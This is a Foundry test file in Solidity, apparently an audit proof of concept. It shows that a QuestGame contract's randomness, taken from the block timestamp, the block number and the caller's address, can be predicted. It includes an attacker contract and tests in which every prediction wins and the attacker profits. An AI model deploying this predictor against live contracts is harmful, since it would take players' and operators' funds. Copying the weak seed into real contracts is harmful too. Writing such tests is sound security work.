
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract AttackerContract {
    QuestGame public questGame;
    
    constructor(QuestGame _questGame) {
        questGame = _questGame;
    }
    
    function attack() external payable {
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(this)
                )
            )
        );
        uint256 predictedNumber = seed % 100;
        
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);
    }
    
    receive() external payable {}
}

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public _contractUnderTest;
    AttackerContract public attacker;

    function setUp() public {
        vm.deal(address(this), 100 ether);
        _contractUnderTest = new QuestGame{value: 10 ether}();
        attacker = new AttackerContract(_contractUnderTest);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockTimestamp < type(uint128).max);
        
        vm.assume(blockNumber >= block.number);
        vm.assume(blockNumber < type(uint128).max);

        vm.deal(address(this), 100 ether);
        vm.deal(address(attacker), 1 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(attacker)
                )
            )
        );
        uint256 expectedNumber = seed % 100;

        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;

        attacker.attack{value: 0.1 ether}();

        (uint256 exp, uint256 wins) = _contractUnderTest.getPlayerStats(address(attacker));
        
        assertEq(wins, 1, "Attacker should have won by predicting the random number");
        assertEq(exp, 100, "Attacker should have gained 100 experience");
        
        uint256 attackerBalanceAfter = address(attacker).balance;
        assertEq(
            attackerBalanceAfter, 
            attackerBalanceBefore + 0.1 ether, 
            "Attacker should have profited 0.1 ether (0.2 reward - 0.1 fee)"
        );
    }

    function test_directPrediction(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockTimestamp < type(uint128).max);
        
        vm.assume(blockNumber >= block.number);
        vm.assume(blockNumber < type(uint128).max);

        vm.deal(address(this), 100 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(this)
                )
            )
        );
        uint256 predictedNumber = seed % 100;

        _contractUnderTest.attemptQuest{value: 0.1 ether}(predictedNumber);

        (uint256 exp, uint256 wins) = _contractUnderTest.getPlayerStats(address(this));
        
        assertEq(wins, 1, "Should win by predicting the random number");
        assertEq(exp, 100, "Should gain 100 experience from winning");
    }

    function test_multipleConsecutiveWins() public {
        vm.deal(address(this), 100 ether);

        for (uint256 i = 0; i < 5; i++) {
            vm.warp(block.timestamp + 1 hours);
            vm.roll(block.number + 1);

            uint256 seed = uint256(
                keccak256(
                    abi.encodePacked(
                        block.timestamp,
                        block.number,
                        address(this)
                    )
                )
            );
            uint256 predictedNumber = seed % 100;

            _contractUnderTest.attemptQuest{value: 0.1 ether}(predictedNumber);
        }

        (uint256 exp, uint256 wins) = _contractUnderTest.getPlayerStats(address(this));
        
        assertEq(wins, 5, "Should win all 5 attempts by predicting random numbers");
        assertEq(exp, 500, "Should gain 500 total experience");
    }

    receive() external payable {}
}
